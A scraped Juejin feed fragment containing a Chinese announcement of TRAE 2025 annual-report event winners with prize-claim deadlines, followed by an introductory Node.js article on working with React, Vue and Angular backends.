pc1d9vHKbEX+Dr4JbzypJDc/YxXYi/wifRLeOXpU5q7n/FK7EXsnBBeeRoqd7/EHj1ZhleeiMjdz8pArRKR+0pb+UsCuK0SkftKW/kzeFmrRHCAxWzufsaJOkqExWzufpOI8EpP1jnCJCK80pN1jjCJ4ICwMigidz/jRD3bI7bZUInIfaWt/KUSuK0SEd4jqFvufgYva5UIDrCYzd3POFFHifhfV/7k8lwPw7D5mUSEV3r854ju2pK7ffOIWzk/X+Go803Lr+ooGqoiwkyP9xzRXVt0q9sE3CgJYTLqfNPyE/irpkoEe2um6ck4bSiBSeD8JBl41jY/Hgd1lIiaaeoyLlsjgUGAjEH3DB4DtUpEW2Z3Mj5GAgA8efbVvXpX/200nln5IMYvKhHDrvylcwdc9+pSNdeg46WQsP7wo2s7fpWYaPT926fw9ZiVk4BpywYJkGuvlJs4EuWS0p/HTyHh3kbzH2najM85cR0lgpPiYMtukFB26m1u5Ua+vkFkWP3Zn0KCJDg1Px6f42Wtvhrhdyz8ncanrFKCmGH1wrwDMCrh/uxPIUFTAvdHbeVPsc1fVRE+c7Ud/k6fWt7XHFlYqcqQ5wTRvWpiY4wrIZwfDUL+akDRUBXB/jCzFCH9SHCzTDRUmsro7z+cEvrHwxOZn2ZTL/pVFcEBtRLoiWXfxQ5ehvoHHx4vpIwUEuJKSMvPz5/zQq0qwmIy5m+rjBQSwnsCQYnlgwjfT72av6oifOba2qnKcOXeGVIP0rT3BALTNr8mBWSpRHAgmJSTtLGhDHwj+A9GPCbX2DNiBSRoShg0H8zl5y/njxIhJ0WntralDJmIbO+UEvz85Zwt9wj7HIDB5Ttp7RkyGbRDSqC49vOjX50P9aexmr+qInzmajvtO13H02SpyrCVMNj8dT7/4BwByDXzRIC0LWXEldA/njVfip9GpV9VERxQM0lPhrVDyrCVMJr5/fwZJ+qWewR1lSuNJ21sXxnjVgIhck5VhM/cqG1WBpIAMX4Z9Xz+eP58sFUiOBArLQcZpQ0CNCXt1HzA5OfPOFGrrwYHyKTwbNJsxolaJUJbKeo0mu/4uMeXBHBbJSK88qP5jo97fAYva5UIDgivHEXk7mecqKNEhFeOhsjdbxKR+0pb+UsCuK0qIveVtvJn8LJWieAAi9nc/YwTdZQIi9nc/SYR4ZWenSO2yZvgcwTuRYZKWBnUI3e/xF7gcmio5L4HWPlL7AVuyPol95W28me8EnuBa8J+sZjM3c94JfYCd6VxTXjaCjDLe+K9cwTuSuOa8LQUYPXvh1d3w0HC7JK8kMK0/rcJfwHkVMYgi4xhOgAAAABJRU5ErkJggg==");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f07dbb3a2df4091aa1c90d82190df0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768292106&amp;x-signature=ZiIHWGF2TO6SUIWkc8atN7J76UI%3D" alt="沸点圈子.png" loading="lazy"/></p>
<p><strong>亲爱的掘友们，TRAE 2025 年度报告分享活动已圆满落幕！</strong></p>
<p>特别感谢每一位在 <a href="https://juejin.cn/pin/topic/7587524867952476206" target="_blank" title="https://juejin.cn/pin/topic/7587524867952476206">#TRAELAND#</a> 话题下晒出年度报告、解锁隐藏编码人格的你。</p>
<p>你们的硬核数据、脑洞创意和真实感悟，让整个活动既满是技术温度，又充满互动乐趣～</p>
<p>每一份分享都是TRAE 1.0.0 的年度纪念 🌟</p>
<p>经过数据统计与合规审核，获奖名单终于揭晓！快来看看谁能将 TRAE 定制周边年终奖抱回家！</p>
<h2 data-id="heading-0">获奖名单</h2>
<p>本次活动按参赛沸点「点赞数 + 评论数」总和排名，同一用户以数据最优作品参与评选，最终确定 64 名获奖者。</p>
<p>完整获奖名单⬇️</p>











































































































































































































<table><thead><tr><th><strong>作者</strong></th><th><strong>角色类型</strong></th><th><strong>作者</strong></th><th><strong>角色类型</strong></th></tr></thead><tbody><tr><td><a href="https://juejin.cn/user/3140624091453053" target="_blank" title="https://juejin.cn/user/3140624091453053">大模型真好玩</a></td><td>持灯者</td><td><a href="https://juejin.cn/user/2546902679956407" target="_blank" title="https://juejin.cn/user/2546902679956407">什么时候能中奖</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/1269294586664749" target="_blank" title="https://juejin.cn/user/1269294586664749">LucianaiB</a></td><td>起源者</td><td><a href="https://juejin.cn/user/2349023906759447" target="_blank" title="https://juejin.cn/user/2349023906759447">笨提莫</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/712139266070525" target="_blank" title="https://juejin.cn/user/712139266070525">akatsuki00</a></td><td>心流狙击手</td><td><a href="https://juejin.cn/user/3034307824727950" target="_blank" title="https://juejin.cn/user/3034307824727950">前端赵哈哈</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/26044011388510" target="_blank" title="https://juejin.cn/user/26044011388510">不如摸鱼去</a></td><td>心流狙击手</td><td><a href="https://juejin.cn/user/3245414491884253" target="_blank" title="https://juejin.cn/user/3245414491884253">xyy</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/3931509312987511" target="_blank" title="https://juejin.cn/user/3931509312987511">zhouzhouya</a></td><td>探索家</td><td><a href="https://juejin.cn/user/4420500273769767" target="_blank" title="https://juejin.cn/user/4420500273769767">不懂就去问</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/4355590446148836" target="_blank" title="https://juejin.cn/user/4355590446148836">人参无肠</a></td><td>未明确</td><td><a href="https://juejin.cn/user/3403743731657982" target="_blank" title="https://juejin.cn/user/3403743731657982">ethan_Yin</a></td><td>探索家</td></tr><tr><td><a href="https://juejin.cn/user/2559318797856664" target="_blank" title="https://juejin.cn/user/2559318797856664">Goooooooooooooooooda</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2344586853496814" target="_blank" title="https://juejin.cn/user/2344586853496814">苏州第一深情</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/2023560267436312" target="_blank" title="https://juejin.cn/user/2023560267436312">ApeAssistant</a></td><td>节奏大师</td><td><a href="https://juejin.cn/user/1638743356481367" target="_blank" title="https://juejin.cn/user/1638743356481367">阿橙的百宝箱</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/84028728031976" target="_blank" title="https://juejin.cn/user/84028728031976">郝同学的测开笔记</a></td><td>未明确</td><td><a href="https://juejin.cn/user/553809592464951" target="_blank" title="https://juejin.cn/user/553809592464951">前端情报社</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/4353721778321800" target="_blank" title="https://juejin.cn/user/4353721778321800">Tinyo</a></td><td>起源者</td><td><a href="https://juejin.cn/user/1787141123213984" target="_blank" title="https://juejin.cn/user/1787141123213984">河海洋</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/1066964360895579" target="_blank" title="https://juejin.cn/user/1066964360895579">碳水重度爱好者</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/2330620381913821" target="_blank" title="https://juejin.cn/user/2330620381913821">TonyLiu</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/3048261967153544" target="_blank" title="https://juejin.cn/user/3048261967153544">PBitW</a></td><td>起源者</td><td><a href="https://juejin.cn/user/3087084378402445" target="_blank" title="https://juejin.cn/user/3087084378402445">陈佬昔编程人生</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/4424901849255742" target="_blank" title="https://juejin.cn/user/4424901849255742">小猴子吖</a></td><td>起源者</td><td><a href="https://juejin.cn/user/571401779029966" target="_blank" title="https://juejin.cn/user/571401779029966">查拉图斯特拉说</a></td><td>未明确</td></tr><tr><td><a href="https://juejin.cn/user/816265914492889" target="_blank" title="https://juejin.cn/user/816265914492889">之维</a></td><td>起源者</td><td><a href="https://juejin.cn/user/1222312659548446" target="_blank" title="https://juejin.cn/user/1222312659548446">围巾哥萧尘</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/1989458366301708" target="_blank" title="https://juejin.cn/user/1989458366301708">是你的小橘呀</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/17205727081735" target="_blank" title="https://juejin.cn/user/17205727081735">南瓜大校</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/2189882892232029" target="_blank" title="https://juejin.cn/user/2189882892232029">王中阳讲AI编程</a></td><td>创世神</td><td><a href="https://juejin.cn/user/796483469196136" target="_blank" title="https://juejin.cn/user/796483469196136">打不过老婆的赛亚人</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/4213783314836030" target="_blank" title="https://juejin.cn/user/4213783314836030">雷电大法王</a></td><td>创世神</td><td><a href="https://juejin.cn/user/3109843365802925" target="_blank" title="https://juejin.cn/user/3109843365802925">天天摸鱼的java工程师</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1961991576240190" target="_blank" title="https://juejin.cn/user/1961991576240190">初辰ge</a></td><td>创世神</td><td><a href="https://juejin.cn/user/308305165032071" target="_blank" title="https://juejin.cn/user/308305165032071">kunLoong</a></td><td>探索家</td></tr><tr><td><a href="https://juejin.cn/user/2700056290397623" target="_blank" title="https://juejin.cn/user/2700056290397623">英文字母不好中</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2186244473229768" target="_blank" title="https://juejin.cn/user/2186244473229768">番茄不红就是酸</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1063982986187486" target="_blank" title="https://juejin.cn/user/1063982986187486">一点一木</a></td><td>起源者</td><td><a href="https://juejin.cn/user/3457290274345454" target="_blank" title="https://juejin.cn/user/3457290274345454">用户4731209378721</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1346244869364782" target="_blank" title="https://juejin.cn/user/1346244869364782">思乡码农</a></td><td>起源者</td><td><a href="https://juejin.cn/user/726098270497661" target="_blank" title="https://juejin.cn/user/726098270497661">花卷小弟</a></td><td>心流狙击手</td></tr><tr><td><a href="https://juejin.cn/user/571401777200855" target="_blank" title="https://juejin.cn/user/571401777200855">青莲使者</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/3139860942296830" target="_blank" title="https://juejin.cn/user/3139860942296830">悟空码字</a></td><td>持灯者</td></tr><tr><td><a href="https://juejin.cn/user/2708795806468382" target="_blank" title="https://juejin.cn/user/2708795806468382">MX巴赫</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2859195116030318" target="_blank" title="https://juejin.cn/user/2859195116030318">舞影随风</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/2682464102784328" target="_blank" title="https://juejin.cn/user/2682464102784328">春去秋又来</a></td><td>创世神</td><td><a href="https://juejin.cn/user/3298993565342151" target="_blank" title="https://juejin.cn/user/3298993565342151">刘羡阳</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/3767346701805048" target="_blank" title="https://juejin.cn/user/3767346701805048">不关橙猫猫的事</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/440258982587470" target="_blank" title="https://juejin.cn/user/440258982587470">花脸丶</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/1310273588955581" target="_blank" title="https://juejin.cn/user/1310273588955581">此帐号已注销</a></td><td>起源者</td><td><a href="https://juejin.cn/user/3544481219755319" target="_blank" title="https://juejin.cn/user/3544481219755319">迷茫路人</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1591748568294120" target="_blank" title="https://juejin.cn/user/1591748568294120">Gyrate</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/430664286745271" target="_blank" title="https://juejin.cn/user/430664286745271">追梦_life</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/993614244352440" target="_blank" title="https://juejin.cn/user/993614244352440">旧梦已逝</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2981531267892856" target="_blank" title="https://juejin.cn/user/2981531267892856">pdudo</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/2559318799424056" target="_blank" title="https://juejin.cn/user/2559318799424056">开坦克的贝塔er</a></td><td>探索家</td><td><a href="https://juejin.cn/user/431468564722270" target="_blank" title="https://juejin.cn/user/431468564722270">旺财是只喵</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1838858941246718" target="_blank" title="https://juejin.cn/user/1838858941246718">codezen</a></td><td>创世神</td><td><a href="https://juejin.cn/user/919655283950878" target="_blank" title="https://juejin.cn/user/919655283950878">飞飞公猪</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/2260251640078536" target="_blank" title="https://juejin.cn/user/2260251640078536">Daxian1996</a></td><td>未明确</td><td><a href="https://juejin.cn/user/307518986787197" target="_blank" title="https://juejin.cn/user/307518986787197">NidhoggDJoking</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/3555135629558891" target="_blank" title="https://juejin.cn/user/3555135629558891">用户85241800072</a></td><td>起源者</td><td><a href="https://juejin.cn/user/4072246797665022" target="_blank" title="https://juejin.cn/user/4072246797665022">LuxiferMorningStart</a></td><td>执剑人</td></tr></tbody></table>
<h2 data-id="heading-1">领奖方式</h2>
<p>🌟上榜的掘友注意 <strong>[系统消息]</strong> （预计2026 年 1 月 6 日 18:00前下发），请于 <strong>2026 年 1 月 12 日 12:00</strong> 前在相关问卷中填写信息，逾期未提交将视为自动放弃奖品，千万不要错过呀～</p>
<p>🎁奖品将于问卷截止日期后的 10 个工作日内安排寄送，后续物流信息会通过私信同步。</p>
<p><strong>若对获奖名单有疑问，请先自查沸点，是否符合活动规则，可</strong> <strong><a href="https://juejin.cn/user/1927863324646522" target="_blank" title="https://juejin.cn/user/1927863324646522">点击链接</a></strong> <strong>联系「小羽轴working」进行申诉~</strong></p>
<p>申诉处理时间2026年1月7日-2026年1月14日，逾期将维持原结果。</p>
<p>再次恭喜所有获奖的掘友🎆你们的分享让好多人都瞧见了与 TRAE 协作 Coding 的无限乐趣和满满成就感～</p>
<p>感谢每一位参与者的超热情投入！</p>
<p>每一次代码优化、每一个需求被攻克，可都是超值得铭记的成长小印记！</p>
<p>未来掘金社区还会带来更多精彩活动和专属福利，记得持续关注官方动态，更多惊喜等你来解锁🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：Node.js + React Vue Angular 前后端协作实践]]></title>    <link>https://juejin.cn/post/7592062873828933682</link>    <guid>https://juejin.cn/post/7592062873828933682</guid>    <pubDate>2026-01-06T08:42:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592062873828933682" data-draft-id="7591969856577912882" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：Node.js + React Vue  Angular 前后端协作实践"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-06T08:42:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：Node.js + React Vue  Angular 前后端协作实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:42:23.000Z" title="Tue Jan 06 2026 08:42:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>随着前后端分离成为主流架构，Node.js 已经成为连接前端框架与后端服务的重要桥梁。无论是 React、Vue 还是 Angular，几乎所有现代前端项目都可以通过 Node.js 构建高效、可扩展的后端系统。</p>
</blockquote>
<p>本文将从整体架构、接口设计、开发流程等方面，介绍 Node.js 与主流前端框架的实际协作方式。</p>
<hr/>
<h2 data-id="heading-0">一、为什么选择 Node.js 作为前端的后端</h2>
<p>Node.js 使用 JavaScript 作为开发语言，与前端技术栈天然统一。</p>
<p>前后端都使用同一语言，可以减少沟通成本，也方便代码复用，例如数据模型、校验规则等。</p>
<p>此外，Node.js 在 I/O 密集型场景下性能表现优秀，非常适合 API 服务。</p>
<hr/>
<h2 data-id="heading-1">二、典型的前后端分离架构</h2>
<p>在实际项目中，常见的架构模式如下：</p>
<ul>
<li>前端：React / Vue / Angular</li>
<li>后端：Node.js + Express / Koa / NestJS</li>
<li>数据层：MySQL / PostgreSQL / MongoDB</li>
<li>通信方式：HTTP / WebSocket</li>
</ul>
<p>前端只负责页面渲染和交互，后端专注于业务逻辑和数据处理。</p>
<hr/>
<h2 data-id="heading-2">三、Node.js 与前端的通信方式</h2>
<p>前端框架通常通过 HTTP 请求与 Node.js 交互。</p>
<p>常见接口形式包括：</p>
<ul>
<li>RESTful API</li>
<li>GraphQL</li>
<li>WebSocket 实时通信</li>
</ul>
<p>Node.js 负责接收请求、处理业务并返回 JSON 数据。</p>
<hr/>
<h2 data-id="heading-3">四、Node.js + React 的协作方式</h2>
<p>React 更关注组件化和状态管理，Node.js 提供纯数据接口。</p>
<p>常见实践包括：</p>
<ul>
<li>使用 Express 提供 REST API</li>
<li>使用 JWT 进行身份认证</li>
<li>React 通过 fetch 或 axios 调用接口</li>
</ul>
<p>这种方式解耦性高，适合大型项目。</p>
<hr/>
<h2 data-id="heading-4">五、Node.js + Vue 的协作方式</h2>
<p>Vue 在中小型项目中应用非常广泛。</p>
<p>常见组合方式为：</p>
<ul>
<li>Vue 负责前端页面</li>
<li>Node.js 作为 API 服务</li>
<li>使用 Vite 或 Vue CLI 构建前端</li>
</ul>
<p>Node.js 不关心页面渲染，只提供数据接口。</p>
<hr/>
<h2 data-id="heading-5">六、Node.js + Angular 的协作方式</h2>
<p>Angular 本身集成度较高，更偏向企业级应用。</p>
<p>Node.js 通常作为独立后端服务，提供：</p>
<ul>
<li>标准化 API</li>
<li>统一权限验证</li>
<li>数据聚合接口</li>
</ul>
<p>Angular 使用 HttpClient 与 Node.js 通信。</p>
<hr/>
<h2 data-id="heading-6">七、接口设计的最佳实践</h2>
<p>为了让前端更易使用，Node.js 接口应保持统一风格。</p>
<p>常见建议包括：</p>
<ul>
<li>使用统一返回格式</li>
<li>明确 HTTP 状态码</li>
<li>接口命名清晰</li>
</ul>
<p>良好的接口设计能显著降低前端开发成本。</p>
<hr/>
<h2 data-id="heading-7">八、身份认证与权限管理</h2>
<p>在前后端分离架构中，通常使用 JWT。</p>
<p>流程为：</p>
<ul>
<li>Node.js 登录接口返回 Token</li>
<li>前端保存 Token</li>
<li>请求时携带 Token</li>
</ul>
<p>这样可以支持多端登录和无状态部署。</p>
<hr/>
<h2 data-id="heading-8">九、跨域问题的处理</h2>
<p>当前后端分开部署时，跨域是常见问题。</p>
<p>Node.js 可以通过中间件统一处理跨域请求。</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">use</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">'cors'</span>)());
</code></pre>
<p>合理配置跨域规则，可以保证安全性。</p>
<hr/>
<h2 data-id="heading-9">十、开发与部署流程</h2>
<p>一个常见的开发流程如下：</p>
<ul>
<li>前端与后端分别开发</li>
<li>约定接口文档</li>
<li>本地联调</li>
<li>独立部署</li>
</ul>
<p>生产环境中，前端和 Node.js 后端可以部署在不同服务器。</p>
<hr/>
<h2 data-id="heading-10">十一、Node.js 是否可以做服务端渲染</h2>
<p>Node.js 也可以参与服务端渲染。</p>
<p>例如：</p>
<ul>
<li>React 的 SSR</li>
<li>Vue 的 SSR</li>
<li>Angular Universal</li>
</ul>
<p>这种方式可以提升首屏加载速度和 SEO 效果。</p>
<hr/>
<h2 data-id="heading-11">十二、总结</h2>
<p>Node.js 与 React、Vue、Angular 的结合，已经成为现代 Web 开发的主流方案。通过清晰的接口设计、统一的认证机制和合理的架构拆分，可以构建高效、可维护的前后端系统。</p>
<p>在《Node.js 编程实战》中，理解这种协作模式，是迈向全栈开发的重要一步。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：前后端结合的 SSR 服务端渲染]]></title>    <link>https://juejin.cn/post/7592062873828966450</link>    <guid>https://juejin.cn/post/7592062873828966450</guid>    <pubDate>2026-01-06T08:42:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592062873828966450" data-draft-id="7592062873828950066" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：前后端结合的 SSR 服务端渲染"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-06T08:42:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：前后端结合的 SSR 服务端渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:42:50.000Z" title="Tue Jan 06 2026 08:42:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
